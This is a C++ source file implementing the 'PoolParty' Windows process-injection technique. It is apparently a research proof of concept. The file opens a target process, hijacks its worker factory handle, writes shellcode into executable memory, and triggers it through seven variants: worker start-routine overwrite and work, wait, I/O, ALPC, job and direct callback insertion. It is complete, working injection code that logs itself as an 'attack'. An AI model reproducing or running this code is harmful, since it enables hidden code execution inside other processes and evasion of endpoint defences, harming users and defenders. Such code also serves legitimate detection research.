#include "PoolParty.hpp"

std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> g_WideString_Converter;

PoolParty::PoolParty(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: m_dwTargetPid(dwTargetPid), m_cShellcode(cShellcode), m_szShellcodeSize(szShellcodeSize)
{
}

std::shared_ptr<HANDLE> PoolParty::GetTargetProcessHandle() const
{
	auto p_hTargetPid = w_OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE, FALSE, m_dwTargetPid);
	BOOST_LOG_TRIVIAL(info) << boost::format("Retrieved handle to the target process: %x") % *p_hTargetPid;
	return p_hTargetPid;
}

std::shared_ptr<HANDLE> PoolParty::GetWorkerFactoryHandle() const
{
	WorkerFactoryHandleHijacker Hijacker{ m_dwTargetPid };
	auto p_hWorkerFactory = Hijacker.Hijack(WORKER_FACTORY_ALL_ACCESS);
	BOOST_LOG_TRIVIAL(info) << boost::format("Hijacked worker factory handle from the target process: %x") % *p_hWorkerFactory;
	return p_hWorkerFactory;
}

WORKER_FACTORY_BASIC_INFORMATION PoolParty::GetWorkerFactoryBasicInformation() const
{
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
	w_NtQueryInformationWorkerFactory(*m_p_hWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), nullptr);
	BOOST_LOG_TRIVIAL(info) << "Retrieved target worker factory basic information";
	return WorkerFactoryInformation;
}

LPVOID PoolParty::AllocateShellcodeMemory() const
{
	LPVOID ShellcodeAddress = w_VirtualAllocEx(*m_p_hTargetPid, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated shellcode memory in the target process: %p") % ShellcodeAddress;
	return ShellcodeAddress;
}

void PoolParty::WriteShellcode() const
{
	w_WriteProcessMemory(*m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize);
	BOOST_LOG_TRIVIAL(info) << "Written shellcode to the target process";
}

void PoolParty::Inject()
{
	BOOST_LOG_TRIVIAL(info) << boost::format("Starting PoolParty attack against process id: %d") % m_dwTargetPid;
	m_p_hTargetPid = this->GetTargetProcessHandle();
	m_p_hWorkerFactory = this->GetWorkerFactoryHandle();
	m_WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation();
	m_ShellcodeAddress = this->AllocateShellcodeMemory();
	this->WriteShellcode();
	this->SetupExecution();
	BOOST_LOG_TRIVIAL(info) << "PoolParty attack completed successfully";
}

WorkerFactoryStartRoutineOverwrite::WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

LPVOID WorkerFactoryStartRoutineOverwrite::AllocateShellcodeMemory() const
{
	BOOST_LOG_TRIVIAL(info) << "Skipping shellcode alloaction, using the target process worker factory start routine";
	return m_WorkerFactoryInformation.StartRoutine; 
}

void WorkerFactoryStartRoutineOverwrite::SetupExecution() const
{
	ULONG WorkerFactoryMinimumThreadNumber = m_WorkerFactoryInformation.TotalWorkerCount + 1;
	w_NtSetInformationWorkerFactory(*m_p_hWorkerFactory, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
	BOOST_LOG_TRIVIAL(info) << boost::format("Set target process worker factory minimum threads to: %d") % WorkerFactoryMinimumThreadNumber;
}

RemoteWorkItemInsertion::RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteWorkItemInsertion::SetupExecution() const
{
	const auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";

	const auto TaskQueueHighPriorityList = &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;

	const auto pWorkItem = w_CreateThreadpoolWork(static_cast<PTP_WORK_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
	BOOST_LOG_TRIVIAL(info) << "Created TP_WORK structure associated with the shellcode";

	/* 
		When a task is posted NTDLL would insert the task to the pool task queue list tail
		To avoid using WriteProcessMemory later on to post the task, we modify the work item's properties as if it was already "posted"
		In addition we make the work item exchangable so that ntdll!TppWorkerThread will process it correctly
	*/
	pWorkItem->CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(m_WorkerFactoryInformation.StartParameter);
	pWorkItem->Task.ListEntry.Flink = TaskQueueHighPriorityList;
	pWorkItem->Task.ListEntry.Blink = TaskQueueHighPriorityList;
	pWorkItem->WorkState.Exchange = 0x2;
	BOOST_LOG_TRIVIAL(info) << "Modified the TP_WORK structure to be associated with target process's TP_POOL";

	const auto RemoteWorkItemAddress = static_cast<PFULL_TP_WORK>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_WORK memory in the target process: %p") % RemoteWorkItemAddress;
	w_WriteProcessMemory(*m_p_hTargetPid, RemoteWorkItemAddress, pWorkItem, sizeof(FULL_TP_WORK));
	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_WORK structure to the target process";

	/* To complete posting the work item we need to complete the task queue list insertion by modifying the pool side */
	auto RemoteWorkItemTaskList = &RemoteWorkItemAddress->Task.ListEntry;
	w_WriteProcessMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
	w_WriteProcessMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
	BOOST_LOG_TRIVIAL(info) << "Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK";
}

RemoteWaitCallbackInsertion::RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

// TODO: Reduce page protections for structures 
void RemoteWaitCallbackInsertion::SetupExecution() const
{
	const auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";

	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port: %d") % *p_hIoCompletion;

	const auto pWait = w_CreateThreadpoolWait(static_cast<PTP_WAIT_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
	BOOST_LOG_TRIVIAL(info) << "Created TP_WAIT structure associated with the shellcode";

	const auto RemoteWaitAddress = static_cast<PFULL_TP_WAIT>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_WAIT memory in the target process: %p") % RemoteWaitAddress;
	w_WriteProcessMemory(*m_p_hTargetPid, RemoteWaitAddress, pWait, sizeof(FULL_TP_WAIT));
	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_WAIT structure to the target process";

	const auto RemoteDirectAddress = static_cast<PTP_DIRECT>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_DIRECT memory in the target process: %p") % RemoteDirectAddress;
	w_WriteProcessMemory(*m_p_hTargetPid, RemoteDirectAddress, &pWait->Direct, sizeof(TP_DIRECT));
	BOOST_LOG_TRIVIAL(info) << "Written the TP_DIRECT structure to the target process";

	const auto p_hEvent = w_CreateEvent(nullptr, FALSE, FALSE, const_cast<LPWSTR>(POOL_PARTY_EVENT_NAME));
	BOOST_LOG_TRIVIAL(info) << boost::format("Created event with name `%s`") % g_WideString_Converter.to_bytes(POOL_PARTY_EVENT_NAME);

	w_ZwAssociateWaitCompletionPacket(pWait->WaitPkt, *p_hIoCompletion, *p_hEvent, RemoteDirectAddress, RemoteWaitAddress, 0, 0, nullptr);
	BOOST_LOG_TRIVIAL(info) << "Associated event with the IO completion port of the target process worker factory";

	w_SetEvent(*p_hEvent);
	BOOST_LOG_TRIVIAL(info) << "Set event to queue a packet to the IO completion port of the target process worker factory ";
}

RemoteIoCompletionCallbackInsertion::RemoteIoCompletionCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteIoCompletionCallbackInsertion::SetupExecution() const
{
	const auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";

	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port: %d") % *p_hIoCompletion;

	const auto p_hFile = w_CreateFile(POOL_PARTY_FILE_NAME, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, nullptr);
	BOOST_LOG_TRIVIAL(info) << boost::format("Created file: `%s`") % g_WideString_Converter.to_bytes(POOL_PARTY_FILE_NAME);

	const auto pTpIo = w_CreateThreadpoolIo(*p_hFile, static_cast<PTP_WIN32_IO_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
	BOOST_LOG_TRIVIAL(info) << "Created TP_IO structure associated with the shellcode";

	// TODO: Should be filled by w_CreateThreadpoolIo
	pTpIo->CleanupGroupMember.Callback = m_ShellcodeAddress;

	++pTpIo->PendingIrpCount;
	BOOST_LOG_TRIVIAL(info) << "Started async IO operation within the TP_IO";

	const auto RemoteIoAddress = static_cast<PFULL_TP_IO>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_IO memory in the target process: %p") % RemoteIoAddress;
	w_WriteProcessMemory(*m_p_hTargetPid, RemoteIoAddress, pTpIo, sizeof(FULL_TP_IO));
	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_IO structure to the target process";

	IO_STATUS_BLOCK IoStatusBlock = { 0 };
	FILE_COMPLETION_INFORMATION FileIoCopmletionInformation = { 0 };
	FileIoCopmletionInformation.Port = *p_hIoCompletion;
	FileIoCopmletionInformation.Key = &RemoteIoAddress->Direct;
	w_ZwSetInformationFile(*p_hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
	BOOST_LOG_TRIVIAL(info) << boost::format("Associated file `%s` with the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_FILE_NAME);

	const std::string Buffer =
		"Dive right in and make a splash,\n"
		"We're throwing a pool party in a flash!\n"
		"Bring your swimsuits and sunscreen galore,\n"
		"We'll turn up the heat and let the good times pour!\n";
	const auto BufferLength = Buffer.length();
	OVERLAPPED Overlapped = { 0 };
	w_WriteFile(*p_hFile, Buffer.c_str(), BufferLength, nullptr, &Overlapped);
	BOOST_LOG_TRIVIAL(info) << boost::format("Write to file `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_FILE_NAME);
}

RemoteAlpcCallbackInsertion::RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

// TODO: Add RAII wrappers here for ALPC funcs
void RemoteAlpcCallbackInsertion::SetupExecution() const
{
	const auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";

	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port: %d") % *p_hIoCompletion;
	
	/* 
		Since we can not re-set the ALPC object IO completion port, we are creating a temporary ALPC object that will only be used to allocate a TP_ALPC structure
	*/
	const auto hTempAlpcConnectionPort = w_NtAlpcCreatePort(nullptr, nullptr);
	BOOST_LOG_TRIVIAL(info) << boost::format("Created a temporary ALPC port: %d") % hTempAlpcConnectionPort;

	/* 
		ntdll!TpAllocAlpcCompletion would set the ALPC object's IO completion port and associate it itself with the local pool's worker factory IO completion port
		We can not avoid calling ntdll!TpAllocAlpcCompletion as it is the easiest way to allocate a valid TP_ALPC structure
		So we just use a temp ALPC object to help us allocate the TP_ALPC structure
		we will later on modify the TP_ALPC to contain a new ALPC object, associated with the target's worker factory IO completion port
	*/
	const auto pTpAlpc = w_TpAllocAlpcCompletion(hTempAlpcConnectionPort, static_cast<PTP_ALPC_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
	BOOST_LOG_TRIVIAL(info) << "Created TP_ALPC structure associated with the shellcode";

	/* Create an ALPC object that does not have an IO copmletion port already set */

	UNICODE_STRING usAlpcPortName = INIT_UNICODE_STRING(POOL_PARTY_ALPC_PORT_NAME);

	OBJECT_ATTRIBUTES AlpcObjectAttributes = { 0 };
	AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	AlpcObjectAttributes.ObjectName = &usAlpcPortName;

	ALPC_PORT_ATTRIBUTES AlpcPortAttributes = { 0 };
	AlpcPortAttributes.Flags = 0x20000;
	AlpcPortAttributes.MaxMessageLength = 328;

	const auto hAlpcConnectionPort = w_NtAlpcCreatePort(&AlpcObjectAttributes, &AlpcPortAttributes);
	BOOST_LOG_TRIVIAL(info) << boost::format("Created pool party ALPC port `%s`: %d") % g_WideString_Converter.to_bytes(POOL_PARTY_ALPC_PORT_NAME) % hAlpcConnectionPort;

	pTpAlpc->AlpcPort = hAlpcConnectionPort;
	
	const auto RemoteTpAlpcAddress = static_cast<PFULL_TP_ALPC>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_ALPC memory in the target process: %p") % RemoteTpAlpcAddress;
	w_WriteProcessMemory(*m_p_hTargetPid, RemoteTpAlpcAddress, pTpAlpc, sizeof(FULL_TP_ALPC));
	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_ALPC structure to the target process";

	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
	AlpcPortAssociateCopmletionPort.CompletionKey = RemoteTpAlpcAddress;
	AlpcPortAssociateCopmletionPort.CompletionPort = *p_hIoCompletion;
	w_NtAlpcSetInformation(hAlpcConnectionPort, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));
	BOOST_LOG_TRIVIAL(info) << boost::format("Associated ALPC port `%s` with the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_ALPC_PORT_NAME);

	OBJECT_ATTRIBUTES AlpcClientObjectAttributes = { 0 };
	AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

	const std::string Buffer =
		"Dive right in and make a splash,\n"
		"We're throwing a pool party in a flash!\n"
		"Bring your swimsuits and sunscreen galore,\n"
		"We'll turn up the heat and let the good times pour!\n";
	const auto BufferLength = Buffer.length();

	ALPC_MESSAGE ClientAlpcPortMessage = { 0 };
	ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
	ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
	std::copy(Buffer.begin(), Buffer.end(), ClientAlpcPortMessage.PortMessage);

	auto szClientAlpcPortMessage = sizeof(ALPC_MESSAGE);

	/* ntdll!NtAlpcConnectPort would block forever if not used with timeout, we set timeout to 1 second */
	LARGE_INTEGER liTimeout = { 0 };
	liTimeout.QuadPart = -10000000;

	w_NtAlpcConnectPort(
		&usAlpcPortName,
		&AlpcClientObjectAttributes,
		&AlpcPortAttributes,
		0x20000,
		nullptr,
		(PPORT_MESSAGE)&ClientAlpcPortMessage,
		&szClientAlpcPortMessage,
		nullptr,
		nullptr,
		&liTimeout
	);
	BOOST_LOG_TRIVIAL(info) << boost::format("Connected to ALPC port `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_ALPC_PORT_NAME);
}

RemoteJobCallbackInsertion::RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteJobCallbackInsertion::SetupExecution() const
{
	const auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";

	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port: %d") % *p_hIoCompletion;

	const auto p_hJob = w_CreateJobObject(nullptr, const_cast<LPWSTR>(POOL_PARTY_JOB_NAME));
	BOOST_LOG_TRIVIAL(info) << boost::format("Created job object with name `%s`") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);

	const auto pTpJob = w_TpAllocJobNotification(*p_hJob, m_ShellcodeAddress, nullptr, nullptr);
	BOOST_LOG_TRIVIAL(info) << "Created TP_JOB structure associated with the shellcode";

	const auto RemoteTpJobAddress = static_cast<PFULL_TP_JOB>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_JOB memory in the target process: %p") % RemoteTpJobAddress;
	w_WriteProcessMemory(*m_p_hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB));
	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_JOB structure to the target process";

	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };

	w_SetInformationJobObject(*p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
	BOOST_LOG_TRIVIAL(info) << boost::format("Zeroed out job object `%s` IO completion port") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);

	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
	JobAssociateCopmletionPort.CompletionPort = *p_hIoCompletion;

	w_SetInformationJobObject(*p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
	BOOST_LOG_TRIVIAL(info) << boost::format("Associated job object `%s` with the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);

	w_AssignProcessToJobObject(*p_hJob, GetCurrentProcess());
	BOOST_LOG_TRIVIAL(info) << boost::format("Assigned current process to job object `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);
}

RemoteDirectCallbackInsertion::RemoteDirectCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteDirectCallbackInsertion::SetupExecution() const
{
	const auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";

	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port: %d") % *p_hIoCompletion;

	TP_DIRECT Direct = { 0 };
	Direct.Callback = m_ShellcodeAddress;
	BOOST_LOG_TRIVIAL(info) << "Manually crafted TP_DIRECT structure associated with the shellcode";

	const auto RemoteDirectAddress = static_cast<PTP_DIRECT>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_DIRECT memory in the target process: %p") % RemoteDirectAddress;
	w_WriteProcessMemory(*m_p_hTargetPid, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT));
	BOOST_LOG_TRIVIAL(info) << "Written the TP_DIRECT structure to the target process";

	w_ZwSetIoCompletion(*p_hIoCompletion, RemoteDirectAddress, 0, 0, 0);
	BOOST_LOG_TRIVIAL(info) << "Queued a packet to the IO completion port of the target process worker factory";
}
